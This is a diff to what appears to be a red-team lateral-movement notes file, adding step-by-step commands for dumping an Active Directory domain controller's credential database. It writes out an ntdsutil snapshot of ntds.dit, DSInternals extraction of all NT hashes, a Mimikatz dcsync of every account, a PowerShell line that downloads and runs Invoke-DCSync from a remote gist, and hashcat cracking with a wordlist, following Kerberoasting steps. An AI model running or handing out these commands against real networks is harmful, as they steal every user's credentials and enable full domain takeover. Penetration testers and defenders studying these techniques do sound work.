@@ -137,3 +137,47 @@ mimikatz # kerberos::list /export
 # Crack the ticket
 python tgsrepcrack.py wordlist.txt Administrator@Hydra-DC~SQLService.MARVEL.LOCAL.kirbi
 ```
+
+## Domain Controller NTDS Dumping
+
+### NTDSutil
+```
+ntdsutil
+activate instance ntds
+ifm
+create full C:\audit
+quit
+quit
+```
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen11.png?raw=true)
+
+Then use DSInternals script to extract all the hashed from this dump.
+
+```
+// https://github.com/MichaelGrafnetter/DSInternals/releases/latest
+​
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHiveFilePath '.\audit\registry\SYSTEM'
+Get-ADDBAccount -All -DBPath '.\audit\Active Directory\ntds.dit' -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt -Encoding ascii
+```
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen12.png?raw=true)
+
+### Mimikatz
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:marvel.local /all /csv"'
+```
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen13.png?raw=true)
+
+### Invoke DCSync
+```
+// https://gist.githubusercontent.com/monoxgas/9d238accd969550136db/raw/7806cc26744b6025e8f1daf616bc359cb6a11965/Invoke-DCSync.ps1
+​
+IEX (New-Object Net.WebClient).DownloadString("https://gist.githubusercontent.com/monoxgas/9d238accd969550136db/raw/7806cc26744b6025e8f1daf616bc359cb6a11965/Invoke-DCSync.ps1");
+Invoke-DCSync -PWDumpFormat
+```
+
+### Cracking
+```
+hashcat.exe -m 1000 -a 0 --username hashes.txt rockyou.txt
+```
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/LateralMovement/Screen14.png?raw=true)
